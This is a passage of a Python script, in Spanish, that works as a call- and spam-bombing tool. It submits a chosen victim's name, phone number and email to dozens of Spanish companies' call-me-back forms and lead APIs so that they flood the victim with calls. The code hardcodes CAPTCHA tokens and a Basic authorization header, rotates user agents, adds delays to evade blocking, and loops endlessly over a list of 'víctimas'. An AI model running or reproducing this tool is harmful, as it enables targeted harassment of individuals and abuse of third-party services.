            '_wpcf7_recaptcha_response': (None, '0cAFcWeA4dl_BWFb4qDg5HHJmCuuid5okoFW4jWmRhI7-B6bcL1DiGH7cKAnaBaxc6BzI2VnzHJRMKkoix0szDT_4bG10eF1AVLMi4eWXA95-tVN73EZ4Z1I3bsWH70qlIfuU8C46v05LSO6MDRJ9lUQRWDmPzcAvBwkG1RgeTXtcGWNBE-7XozI2p4O9ISSsZ8NbmxN1bCC2TSvfNZNaQGwmYjbj5fZYBtUApMPOk3SimC6kcZCVhikLEQV2LCskDmz0MiSv3ww8djWlpKTmidkWpj5P2PuxAgUs8uHAJXBroY0Djtduqv5yPoFSVN9nWJe1WqPVh47F7ZkYB__HgXeZKpDSmlgpUc_lZ5P_LoLxuu7y7EqXbewlKAzdB5nMUyPDKLJq6TP7R0K9Z4XoPiWWkFTj381JJ_hHEvi0qaoFIhjAhzKX3-s1auHq6aLlVKpPrmvXwS8qC5bjoZ-C2_SHOMgjvTKA0S8wWjb9_erZY-7feob7XkfWJzbA8SSAlXNShCuzc-D6MWYKdffc-tpvOHUXmiZXjEunGlvhi3jwLIyCbhAR9FhvHEPJGOTvhNFd8tWOfLWqb34BgagMUvDKN6hWkoalcEt0e6XiTClJd8k8TQz0lOSW472b7Nn0V6k3D2c64GJs1QOLzgTYnlI-WdEyDaVgz1B8Hry4i1raVI7UzQb-wV7If5cExgFPQAWkBE04gPKqViI-wDyjKI8aCzjlBVLBHyDSnRHne8St7IUPrgtDirdka9wvMr1ksCuLjjI0F_q4ouK8bxHpk4YM38epOY-hkQi3Qah0v4_2JLUJDn0-lYNoEmlErDnjwyfIuwUwXuQEGiEg5QdbL8koiarAh1rNhoqlglipJ6xf1RseIWn7Kdy9GPqSKMhG4oQWZJVQs87dVyhOJbnTGPNVa3BdlPBPi0g1RPZQePKDLExrVGh83D_Lgnq4qi701ZgGWU_TDHPOiut9LhO4lUaNVCD82LC8RFeT2UcNy0scypQDochte77ekY0vaievMac77OPc4964NdIVcdx7azePcBSCXo8UPKaypaaH_13SKueQjo6SmRisN0NTZCV2sk2ahCFPkOdXl97F72Ru2NPPO5ll2H80gpCGScxCxBuLbY_dTlFBo0JFVQW0yuSmUBugK4YcNGj-YtlzPcV3QquxKhUkb3r6pPwCWuo1B3F8SWHkz9iNZqs4eor23cbsJOqvT7hxStrKHtJAq-qR6sDT6kU7a4qcydwcWpC42Y5TbGDCWX3rT06ezAQonBMuf-f11BT6wHMVtL55DZuVY9D8tVwULtL_dQlWiGwiITif0BACw8yqfadhEqZ-FRrAR8yw9Wv20qfDrTADUsbJsqhFF0DCeU4ddI1bfS-UT_NnuRjIlLH-2_oplppJ9rrs9z7OhNu88wsISSNLOjKKbByuQ7_fDrl6HIEsG3cGZFA18-yikZL41lMBEgQqegwGaiYQzlMX5zuBPLltS_luZzYYRiwOH2YWVyuVIsgQ6dxqWVFmWvfNzmSsDIdN2iySG2DxSSnRliDWKq8b5IpGQGgrrcnLmdbSn6g'), # Best effort hardcoded token
            'nombre': (None, name),
            'telefono': (None, number),
            'email': (None, email),
            'newsletter[]': (None, 'QUIERO SUSCRIBIRME A LA NEWSLETTER Y RECIBIR NOTICIAS'),
            'privacidad': (None, '1')
        }
        
        res = requests.post(url, files=files, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "SoyBiti: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"SoyBiti: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"SoyBiti: Error {e}" + Style.RESET_ALL)

def attack_nara_digital(number, name, email):
    try:
        url = "https://services.hna.es/salesmanago/internal/addContact"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://www.naradigital.es/",
            "Origin": "https://www.naradigital.es",
            "application": "NARA",
            "authorization": "Basic YWxlamFuZHJvOmxpbWJv",
            "cia": "103",
            "idioma": "es",
            "Content-Type": "application/json"
        }
        
        data = {
            "ForceOptIn": True,
            "Contact": {
                "Email": email,
                "Phone": number,
                "Name": name
            },
            "Tags": ["FORM_TE_LLAMAMOS_WEB"]
        }
        
        res = requests.post(url, json=data, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Nara Digital: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Nara Digital: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Nara Digital: Error {e}" + Style.RESET_ALL)

def attack_somos_finance(number, name):
    try:
        url = "https://www.somosfinance.es/es/te-llamamos/"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://www.somosfinance.es/es/te-llamamos/",
            "Origin": "https://www.somosfinance.es"
        }
        
        # Multipart form data
        files = {
            'id_formulario': (None, '62'),
            'js': (None, '1'),
            'campo949': (None, name),
            'campo951': (None, number),
            'campo955': (None, '9-12')
        }
        
        res = requests.post(url, files=files, headers=headers, timeout=10)
        
        if res.status_code == 302 or res.status_code == 200:
             print(Fore.GREEN + "Somos Finance: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Somos Finance: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Somos Finance: Error {e}" + Style.RESET_ALL)

def attack_terranea(number, name):
    try:
        url = "https://www.terranea.es/assets/ajax/insertaTellamamos.aspx/insertaTeLlamamos"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://www.terranea.es/POPUP/TE-LLAMAMOS.ASPX",
            "Origin": "https://www.terranea.es",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/json; charset=UTF-8"
        }
        
        # Calculate tomorrow's date
        from datetime import datetime, timedelta
        tomorrow = datetime.now() + timedelta(days=1)
        fecha_contacto = tomorrow.strftime("%d/%m/%Y 09:00")
        
        data = {
            "nombre": name,
            "telefono": number,
            "fechaContacto": fecha_contacto,
            "idComparativa": "",
            "url": "https://www.terranea.es/POPUP/TE-LLAMAMOS.ASPX#",
            "ramoUrl": "",
            "cid": "",
            "aux": ""
        }
        
        res = requests.post(url, json=data, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Terranea: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Terranea: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Terranea: Error {e}" + Style.RESET_ALL)

def attack_uk_school(number, name, email):
    try:
        url = "https://ukschool.es/index.php/contacto/"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://ukschool.es/index.php/contacto/",
            "Origin": "https://ukschool.es"
        }
        
        # Multipart form data
        files = {
            'frm_action': (None, 'create'),
            'form_id': (None, '1'),
            'frm_hide_fields_1': (None, ''),
            'form_key': (None, 'contact-form'),
            'item_meta[0]': (None, ''),
            'frm_submit_entry_1': (None, '6d5420516c'),
            '_wp_http_referer': (None, '/index.php/contacto/'),
            'item_meta[7]': (None, name),
            'item_meta[3]': (None, email),
            'item_meta[8]': (None, number),
            'item_meta[5]': (None, 'Información curso'),
            'item_meta[9][]': (None, 'I have read and accepted the privacy terms and conditions'),
            'g-recaptcha-response': (None, '0cAFcWeA79_yVfEw99V9XXPaGhoSCZQudWchcQm6OZQ6OGLHuuLwi1Sk9rzWAWE1qIlcIZK_aT8XRU71d4ueUTWkkKjOkqJVQwK98w2Tir06IgOfVFTr7WgEN7k3IatSyYRyU-Qo1DqGsRV_5Pm_YfAs1bEtxaCaGD5Qpv7ZnGatIQbEkNTG0QdCn2oRBCGAftJDG2LzI4-czMVSxOB67TfBiudL1S7nUKqFZVhp4yeXaNXaaQbUBsvZ-Ywd657gvHAowooc2fi3cQhuW-MTi6nYhmGkxO0u9DSGo3oy8CYu6fNnmrdao0c1qons2G_fdUQPZ-xVoA_SQgmpolTIpYieE_ooFu6zMqTV9Dk2y-UQOxG317v0msj60swE2SIOATDQh9tMXDuXYSKdALx_xtufpNBvr1q0NkKhDvU556R74QDGryA4rOKoNeCYOmJygXYuAL9OKHAxVXKzqwsyxk8lI8_hRt6Bychq_ut9NeY98i8KY5wI78VdCVCZPcP_kiHix1dlYC-xydOK-vLsl05Rvf9TRB_VueIsZ0Sx8g08GFOqgNDmbzVA07iognoWHDBj_demC9r201t5SM1gD7MOKGbUFSKF4up2o8_fxqkJI0irMHi9tlmaBCUwPxQHK6PWcfnYCyKQaXWMGeMDRJ1T53eOXAa9ZYVVkFXZQcAhxkjDpnKnB7JR4umLkcKF38Lu9GOuC31s8noEdIPJ5tQ8vVK61_FzMLDPl3IQgYWTNcYkM2Hfjp_Bv92bdPdzgUVQxB2QBfvKj17VMaGuW0DSbi-edD3nngbfO_HsDwp9LnnL7vwdt5849NNOK53uIWd6PiPsSC9CvYfi4hJJbQwjDeNG7vHWmhDq0Z9NVGOcn8yJ14ImHwHjO3sa0yrlRz3UmK75C749shX5BVe_rck_cH-lVrexCWIxSkzOJfKkeVuvNopdt-XUDxaHCvwBSmwf8tUXLCyRVNkwBh_LZbpk0MITAsqdfQ8LhuzLI7vy2jSm-xCXrbmkeXjJWxZ_LdQ3BoHVM7hYA7vM-SHKTSeNAxHhhDcMKU_YkjElSJSsw9-s5qeAdpX40LSs_OtiUZwCEVkTxF4k2XKF-RGaoNujqQQgd2Tl6wJs4G2_NxPzSl5Y-7zwZnWiZ4d6RRaiUpk0eTqrsTCCrIdLkG1jUDCW5fggQI4-V5SJRhf9l71dUBLdGnDdWuz-0Ds1eyydymGHlCqCy9SxrZqLDZuXXsl2lSXlVR7keDfiHMvemaqcWMQZa_dx-t7RQiasVLXMqw90SiFRKTIoratbN4d6jiq51KjgjRwqfTHnJjg_7tHKKz8QjUz609S_171xZQ4Lb188r290vmJFsoUI5OrAOCtggaEL90Zgn8-4rZh0kPFFPeaFap_HfQImfBzohX8FXUcvVvyRNG2mqUdP_5kg5ieB2g69YiyHI3_ydvuIeTY2aLtLp7a_iP13WJhLDPD64YYhCn8MtN0GdT5057TsGSvLdByEwY9S7GaizyB-YeShbl_KFk87mwIh2l6W2z8CDK-7e50l9IwyOra3k1UnTVRcYWD_6ABK1JYmD5HBlXh72oLVKIfEZXe-72FOI9tsdDLcz3Lueq-N7n'), # Best effort hardcoded token
            'item_key': (None, ''),
            'unique_id': (None, 'a300c0e50e0fbe74-19b3c7cf3f3')
        }
        
        res = requests.post(url, files=files, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "UK School: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"UK School: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"UK School: Error {e}" + Style.RESET_ALL)

def main():
    if not args.start and not debug:
        pass

    # Servicios dedicados (Ingeniería inversa realizada)
    specific_services = [
        lambda: attack_securitas_direct(number, name),
        lambda: attack_isalud_api(number, name, surname, email),
        lambda: attack_recordador(number),
    ]

    # Servicios automáticos (Intentar parsear el form)
    # Lista de webs del bot original que tienen forms "normales"
    urls_auto = [
        "https://www.euroinnova.com/",
        "https://telecable.es/",
        "https://www.racctelplus.cat/es",
        "https://spamovil.es/te-llamamos-gratis/",
        "https://www.proyectosyseguros.com/te-llamamos/",
        "https://www.centrodermatologicoestetico.com/te-llamamos/",
        "https://www.elpaso2000.com/te-llamamos/"
    ]

    services = specific_services + [
        (lambda u=url: SmartFormAttacker(u, name, surname, number, email).run()) for url in urls_auto
    ]

    print(Fore.CYAN + f"[*] Iniciando ataque masivo ({len(services)} objetivos)..." + Style.RESET_ALL)
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(s) for s in services]
        for future in as_completed(futures):
            if interrupted: break
            try:
                future.result()
            except Exception as e:
                pass

    print(Fore.CYAN + "[*] Ronda finalizada." + Style.RESET_ALL)
    if not args.start and not debug:
        input("Presione ENTER para volver al menú...")

def modo_automatico():
    print(Fore.GREEN + '[*] INICIALIZANDO ATAQUE AUTOMÁTICO...' + Style.RESET_ALL)
    time.sleep(0.5)
    formulario()
    while not interrupted:
        main()
        if args.start: 
            time.sleep(5)
        else:
            break

def modo_combo_operadoras():
    print(Fore.GREEN + '[*] INICIALIZANDO ATAQUE OPERADORAS (COMBO)...' + Style.RESET_ALL)
    time.sleep(0.5)
    
    # Capture list of victims
    victims = formulario()
    
    print(Fore.GREEN + f'[*] INICIANDO LOOP DE ATAQUE PARA {len(victims)} VÍCTIMAS...' + Style.RESET_ALL)
    
    while not interrupted:
        idx = 1
        for victim in victims:
            v_number = victim['number']
            v_name = victim['name']
            v_surname = victim['surname']
            v_email = victim['email']
            
            print(Fore.CYAN + f"[*] [{idx}/{len(victims)}] Lanzando ráfaga a: {v_name} ({v_number})..." + Style.RESET_ALL)
            
            # Re-define funcs with current victim data
            funcs = [
                lambda: attack_euskaltel(v_number),
                lambda: attack_masmovil_byside(v_number),
                lambda: attack_guuk_byside(v_number),
                lambda: attack_telecable(v_number),
                lambda: attack_mundo_r(v_number),
                lambda: attack_hits_mobile(v_number),
                lambda: attack_excom(v_number),
                lambda: attack_adamo(v_number),
                lambda: attack_embou(v_number),
                lambda: attack_avatel(v_number),
                lambda: attack_youmobile(v_number),
                lambda: attack_isalud_fiatc(v_number, v_name, v_email),
                lambda: attack_integra_energia(v_number, v_name),
                lambda: attack_nadunet(v_number, v_name),
                lambda: attack_premaat(v_number, v_name),
                lambda: attack_lavanguardia(v_number, v_name),
                lambda: attack_populoos(v_number),
                lambda: attack_silbo(v_number, v_name, v_surname),
                lambda: attack_telecomunicaciones_guay(v_number, v_name, v_surname),
                lambda: attack_eni_plenitude(v_number),
                lambda: attack_obligado_cumplimiento(v_number, v_name),
                lambda: attack_movistar_prosegur(v_number),
                lambda: attack_sofrologia(v_number, v_name),
                lambda: attack_jazztel_adslhouse(v_number),
                lambda: attack_arvitelco(v_number, v_name, v_surname, v_email),
                lambda: attack_mutualmed(v_number, v_name),
                lambda: attack_paradores(v_number, v_name),
                lambda: attack_buala(v_number, v_name, v_surname),
                lambda: attack_amg_telecomunicaciones(v_number),
                lambda: attack_llamame_gratis(v_number),
                lambda: attack_prosegur(v_number),
                lambda: attack_soybiti(v_number, v_name, v_email),
                lambda: attack_nara_digital(v_number, v_name, v_email),
                lambda: attack_somos_finance(v_number, v_name),
                lambda: attack_terranea(v_number, v_name),
                lambda: attack_uk_school(v_number, v_name, v_email)
            ]
            print(Fore.CYAN + "[*] Lanzando ráfaga..." + Style.RESET_ALL)
            
            # Use ThreadPoolExecutor but submit sequentially with delays
            with ThreadPoolExecutor(max_workers=36) as executor:
                futures = []
                for func in funcs:
                    if interrupted: break
                    future = executor.submit(func)
                    futures.append(future)
                    
                    # Random delay between requests to avoid blocking
                    sleep_time = random.randint(3, 8)
                    # Print delay to console so user sees it is waiting
                    print(Fore.MAGENTA + f"[*] Esperando {sleep_time}s para siguiente petición..." + Style.RESET_ALL)
                    time.sleep(sleep_time)
                
                # Wait for all to complete
                for future in as_completed(futures):
                    pass
            
            # Random delay between victims if there are multiple or just to pause slightly
            delay = random.randint(5, 15)
            print(Fore.MAGENTA + f"[*] Esperando {delay} segundos para siguiente objetivo/ronda..." + Style.RESET_ALL)
            time.sleep(delay)
            
            idx += 1
            
            if interrupted:
                break
        
        print(Fore.CYAN + "[*] Ronda completa de todas las víctimas finalizada." + Style.RESET_ALL)
        if not args.start and not debug:
            opcion = input("Presione ENTER para continuar otra ronda (o escribe 'exit' para salir)...")
            if opcion.lower() == 'exit':
                break
        elif args.start:
            # In automatic start mode, we just loop forever with the delays
            pass
        else:
            # If debug or regular mode without args.start, we looped once fully.
            # The original logic kept looping 'while not interrupted'.
            # We already have a loop above.
            pass

def menu_principal():
    while True:
        clear_console()
        print(pakito_header)
        print(Fore.GREEN + "SISTEMA LISTO - SELECCIONE OPERACIÓN" + Style.RESET_ALL)
        print(Fore.GREEN + "[1] EJECUTAR ATAQUE AUTOMÁTICO (MASIVO)" + Style.RESET_ALL)
        print(Fore.GREEN + "[2] EJECUTAR ATAQUE RÁPIDO (COMBO OPERADORAS)" + Style.RESET_ALL)
        print(Fore.GREEN + "[0] SALIR" + Style.RESET_ALL)
        
        try:
            opcion = input(Fore.GREEN + Style.BRIGHT + "Seleccione una opción: " + Style.RESET_ALL)
            if opcion == '1':
                modo_automatico()
            elif opcion == '2':
                modo_combo_operadoras()
            elif opcion == '0':
                sys.exit()
        except EOFError:
            sys.exit()
        except KeyboardInterrupt:
            sys.exit()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, handle_interrupt)
    if args.start:
        name, surname, number, email = args.start
        modo_automatico()
    elif debug:
        modo_automatico()
    else:
        menu_principal()
